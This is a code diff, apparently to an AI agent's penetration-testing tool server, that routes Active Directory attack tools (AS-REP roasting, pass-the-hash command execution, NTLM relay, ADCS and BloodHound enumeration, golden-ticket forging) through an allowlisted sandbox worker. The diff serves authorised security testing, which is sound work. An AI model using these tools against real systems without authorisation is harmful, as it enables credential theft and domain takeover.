@@ -3,7 +3,7 @@
 Phase 1 capability vertical. Each tool is target-IP-locked:
   * ``@require_allowlist()`` gates the primary ``target_ip``;
   * secondary DC IPs are gated by ``_gate_dc`` (allowlist unless == target);
-  * every command runs as an argv list (no shell) via ``run_argv_captured``;
+  * every command runs as an argv list (no shell) inside the sandbox worker;
   * output lands under ``exploit_workspace/<ip>/<attempt_id>/``.
 
 All keys live under ``exploit.ad_kerberos`` and default OFF (the master
@@ -19,15 +19,14 @@ interface names, and the ticketer duration are bounded.
 
 from __future__ import annotations
 
-import os
 import re
-import shutil
-import subprocess
 from pathlib import Path
 from typing import Any
 
+from tools.kernel.workspace import write_workspace_file
 from tools.mcp_shared import _allowed_target_list, _attempt_dir, check_targets_allowlist
-from tools.mcp_tools.registry import ToolContext, _run_with_pgrp_timeout, run_argv_captured
+from tools.mcp_tools.registry import ToolContext
+from tools.mcp_tools.sandbox_exec import run_tool_argv_in_sandbox
 from tools.validation_utils import is_fqdn, validate_nt_hash, validate_ntlm_hash, validate_target_or_ip
 
 # Domain SIDs look like S-1-5-21-<sub>-<sub>-<sub>[-<rid>]; anything else
@@ -277,25 +276,50 @@ def _tail(output: str) -> str:
     return text[-_OUTPUT_CHARS:] + "\n[truncated]"
 
 
-def _run(argv: list[str], timeout: int) -> tuple[str, int | None, str]:
-    """Run argv via the shared captured-run helper.
+def _run(
+    ctx: ToolContext,
+    argv: list[str],
+    timeout: int,
+    target_ip: str,
+    *,
+    tool_name: str,
+    targets: list[str] | None = None,
+) -> tuple[str, int | None, str]:
+    """Run an AD command inside the target-scoped disposable worker.
 
     Args:
+        ctx: Session context containing the sandbox manager.
         argv: Already-built argv list (no shell).
         timeout: Hard timeout in seconds.
+        target_ip: Primary allowlisted target.
+        tool_name: MCP tool name used in the sandbox audit row.
+        targets: All secondary network destinations (for example, a DC).
     Returns:
         ``(status, returncode, output)``; returncode is preserved so callers
         surface it as EXIT_CODE. The output is the tail (``_OUTPUT_CHARS``)
         with a ``[truncated]`` marker when the tool trimmed it.
-    Gates: None (caller pre-gates).
-    Side-effects: Spawns the child process.
+    Gates: Full target list is rechecked by the sandbox manager.
+    Side-effects: Spawns the child process inside the sandbox worker.
     """
-    status, returncode, output, _ = run_argv_captured(argv, timeout, max_chars=_FETCH_CHARS)
+    status, returncode, output, _ = run_tool_argv_in_sandbox(
+        ctx,
+        argv,
+        timeout=timeout,
+        target_ip=target_ip,
+        targets=targets,
+        tool_name=tool_name,
+        max_chars=_FETCH_CHARS,
+    )
     return status, returncode, _tail(output)
 
 
 def _run_with_cwd_env(
-    argv: list[str], timeout: int, cwd: Path, env_extra: dict[str, str]
+    ctx: ToolContext,
+    argv: list[str],
+    timeout: int,
+    cwd: Path,
+    env_extra: dict[str, str],
+    target_ip: str,
 ) -> tuple[str, int | None, str]:
     """Run argv with a working directory + extra env (ticketer ccache path).
 
@@ -312,25 +336,17 @@ def _run_with_cwd_env(
     Gates: None (caller pre-gates).
     Side-effects: Spawns the child process with cwd=attempt_dir.
     """
-    env = dict(os.environ)
-    env.update(env_extra)
-    try:
-        returncode, out, err = _run_with_pgrp_timeout(
-            argv,
-            timeout,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            cwd=str(cwd),
-            env=env,
-        )
-        output = _tail(((out or "") + "\n" + (err or ""))[-_FETCH_CHARS:])
-        return ("completed" if returncode == 0 else "failed"), returncode, output
-    except subprocess.TimeoutExpired:
-        name = argv[0] if argv else "command"
-        return "timed_out", None, f"{name} timed out after {timeout}s"
-    except Exception as exc:  # ponytail: bare except intentional — run failure is data, not a crash
-        return "error", None, str(exc)
+    status, returncode, output, _ = run_tool_argv_in_sandbox(
+        ctx,
+        argv,
+        timeout=timeout,
+        cwd_host=cwd,
+        env=env_extra,
+        target_ip=target_ip,
+        tool_name="golden_ticket",
+        max_chars=_FETCH_CHARS,
+    )
+    return status, returncode, _tail(output)
 
 
 def _exit_line(rc: int | None) -> str:
@@ -424,7 +440,7 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
         attempt_dir, attempt_id = _attempt_dir(workspace)
         out_file = attempt_dir / "asrep_hashes.txt"
         argv.extend(["-outputfile", str(out_file)])
-        status, rc, output = _run(argv, 300)
+        status, rc, output = _run(ctx, argv, 300, target_ip, tool_name="asrep_roast", targets=[target_ip, dc])
         size = out_file.stat().st_size if out_file.exists() else 0
         return (
             f"ASREP_ROAST_RESULT: {status}\n"
@@ -472,18 +488,13 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
             return cmd_err
         nt = (ntlm_hash or "").strip().split(":")[-1]
 
-        nxc = shutil.which("nxc") or shutil.which("crackmapexec")
         attempt_dir, attempt_id = _attempt_dir(workspace)
-        if nxc:
-            argv = [nxc, svc, target_ip, "-u", user, "-H", nt]
-            if cmd:
-                argv.extend(["-x", cmd])
-        else:
-            # impacket-wmiexec fallback (smb-via-WMI; works for both smb/winrm intent).
-            argv = ["impacket-wmiexec", "-hashes", f":{nt}", f"{user}@{target_ip}"]
-            if cmd:
-                argv.append(cmd)
-        status, rc, output = _run(argv, 300)
+        # Use the worker's installed Impacket tool directly. Host-side
+        # executable discovery would select a host binary and bypass pinned DNS.
+        argv = ["impacket-wmiexec", "-hashes", f":{nt}", f"{user}@{target_ip}"]
+        if cmd:
+            argv.append(cmd)
+        status, rc, output = _run(ctx, argv, 300, target_ip, tool_name="pass_the_hash")
         return (
             f"PASS_THE_HASH_RESULT: {status}\n"
             f"ATTEMPT_ID: {attempt_id}\n"
@@ -530,15 +541,14 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if h_err:
             return h_err
 
-        certipy = shutil.which("certipy") or "certipy"
-        argv = [certipy, "find", "-u", f"{user}@{domain.strip()}", "-dc-ip", dc]
+        argv = ["certipy", "find", "-u", f"{user}@{domain.strip()}", "-dc-ip", dc]
         if (password or "").strip():
             argv.extend(["-p", password.strip()])
         argv.extend(harg)
         argv.extend(["-target", target_ip])
         attempt_dir, attempt_id = _attempt_dir(workspace)
         argv.extend(["-output", str(attempt_dir / "adcs")])
-        status, rc, output = _run(argv, 300)
+        status, rc, output = _run(ctx, argv, 300, target_ip, tool_name="adcs_enum", targets=[target_ip, dc])
         return (
             f"ADCS_ENUM_RESULT: {status}\n"
             f"ATTEMPT_ID: {attempt_id}\n"
@@ -584,15 +594,14 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if h_err:
             return h_err
 
-        bh = shutil.which("bloodhound-python") or "bloodhound-python"
-        argv = [bh, "-u", username.strip(), "-d", domain.strip(), "-dc", dc]
+        argv = ["bloodhound-python", "-u", username.strip(), "-d", domain.strip(), "-dc", dc]
         if (password or "").strip():
             argv.extend(["-p", password.strip()])
         argv.extend(harg)
         argv.extend(["-c", "All", "--zip"])
         attempt_dir, attempt_id = _attempt_dir(workspace)
         argv.extend(["-o", str(attempt_dir / "bloodhound")])
-        status, rc, output = _run(argv, 600)
+        status, rc, output = _run(ctx, argv, 600, target_ip, tool_name="bloodhound_collect", targets=[target_ip, dc])
         return (
             f"BLOODHOUND_COLLECT_RESULT: {status}\n"
             f"ATTEMPT_ID: {attempt_id}\n"
@@ -647,17 +656,19 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if not targets:
             return "BLOCKED: no allowlisted relay targets (exploit.allowed_targets empty and no runtime target)."
 
-        attempt_dir, attempt_id = _attempt_dir(workspace)
-        targets_file = attempt_dir / "relay_targets.txt"
-        targets_file.write_text("\n".join(targets) + "\n")
+        _, attempt_id = _attempt_dir(workspace)
+        targets_file = write_workspace_file(
+            workspace,
+            f"{attempt_id}/relay_targets.txt",
+            ("\n".join(targets) + "\n").encode("utf-8"),
+        )
 
-        ntlmrelayx = shutil.which("ntlmrelayx.py") or "ntlmrelayx.py"
-        argv = [ntlmrelayx, "-tf", str(targets_file), "-smb2support"]
+        argv = ["ntlmrelayx.py", "-tf", str(targets_file), "-smb2support"]
         if iface_s:
             argv.extend(["-i", iface_s])
         if cmd:
             argv.extend(["-c", cmd])
-        status, rc, output = _run(argv, 300)
+        status, rc, output = _run(ctx, argv, 300, target_ip, tool_name="responder_relay", targets=targets)
         return (
             f"RESPONDER_RELAY_RESULT: {status}\n"
             f"ATTEMPT_ID: {attempt_id}\n"
@@ -690,13 +701,8 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
             return err
         attempt_dir, attempt_id = _attempt_dir(workspace)
 
-        nxc = shutil.which("nxc") or shutil.which("crackmapexec")
-        if nxc:
-            argv = [nxc, "smb", target_ip, "--signing"]
-        else:
-            nmap_bin = shutil.which("nmap") or "nmap"
-            argv = [nmap_bin, "--script", "smb2-security-mode", "-p", "445", target_ip]
-        status, rc, output = _run(argv, 120)
+        argv = ["nmap", "--script", "smb2-security-mode", "-p", "445", target_ip]
+        status, rc, output = _run(ctx, argv, 120, target_ip, tool_name="smb_signing_check")
         return (
             f"SMB_SIGNING_CHECK_RESULT: {status}\n"
             f"ATTEMPT_ID: {attempt_id}\nTARGET: {target_ip}\n"
@@ -748,7 +754,7 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
         attempt_dir, attempt_id = _attempt_dir(workspace)
         safe_user = re.sub(r"[^A-Za-z0-9_.-]", "_", user) or "ticket"
         ccache = attempt_dir / f"{safe_user}.ccache"
-        ticketer = shutil.which("impacket-ticketer") or "impacket-ticketer"
+        ticketer = "impacket-ticketer"
         argv = [
             ticketer,
             "-nthash",
@@ -765,7 +771,7 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
         ]
         # impacket-ticketer writes <user>.ccache in CWD: root the run at the
         # attempt dir and point KRB5CCNAME at the same file.
-        status, rc, output = _run_with_cwd_env(argv, 120, attempt_dir, {"KRB5CCNAME": str(ccache)})
+        status, rc, output = _run_with_cwd_env(ctx, argv, 120, attempt_dir, {"KRB5CCNAME": str(ccache)}, target_ip)
         size = ccache.stat().st_size if ccache.exists() else 0
         tip = target_ip.strip()
         return (
